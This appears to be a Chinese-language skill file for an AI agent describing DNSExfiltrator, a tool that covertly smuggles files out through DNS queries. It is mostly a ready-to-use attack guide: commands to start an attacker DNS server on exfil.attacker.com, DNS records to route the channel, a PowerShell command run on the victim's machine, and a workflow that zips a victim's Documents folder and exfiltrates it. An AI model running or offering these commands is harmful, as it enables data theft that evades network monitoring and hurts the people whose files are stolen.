---
name: dnsexfiltrator
description: >
  此技能适用于用户询问关于 "dnsexfiltrator"、"HTTP/S 通道被封锁时通过 DNS 流量进行隐蔽文件传输"、"利用 DNS TXT/A 记录进行数据渗出" 的场景。通过 DNS 查询实现隐蔽文件渗出的工具，使用自定义 DNS 服务器接收数据。
---

# DNSExfiltrator

通过 DNS 隐蔽渗出文件 — Python 服务端接收，PowerShell 客户端发送。

## 快速开始

```bash
# 攻击方 — 启动 DNS 服务器（需要 UDP 53 端口）
sudo python3 dnsexfiltrator.py -d exfil.attacker.com -p password

# 受害方（PowerShell）
Invoke-DNSExfiltrator -i C:\sensitive\file.zip -d exfil.attacker.com -p password -t 500
```

## DNS 配置

将子域名的 NS 记录指向监听服务器 IP：
```
exfil.attacker.com    NS    ns1.attacker.com
ns1.attacker.com      A     <your-server-ip>
```

## 核心参数

| 参数 | 说明 |
|--------|---------|
| `-d DOMAIN` | 渗出域名（服务端） |
| `-p PASSWORD` | 加密密码 |
| `-b 64/32` | 编码方式（base64/base32） |
| `-t MS` | 查询间隔限速（毫秒） |
| `-r N` | 最大重试次数 |

## 常用工作流

**从 Windows 渗出压缩包：**
```powershell
# 先压缩
Compress-Archive -Path C:\Users\victim\Documents -DestinationPath docs.zip
# 渗出
Invoke-DNSExfiltrator -i docs.zip -d exfil.attacker.com -p MyPass123 -t 200
```

## 资源

| 文件 | 何时加载 |
|------|--------------|
| `references/` | DNS 配置指南与限速调优 |
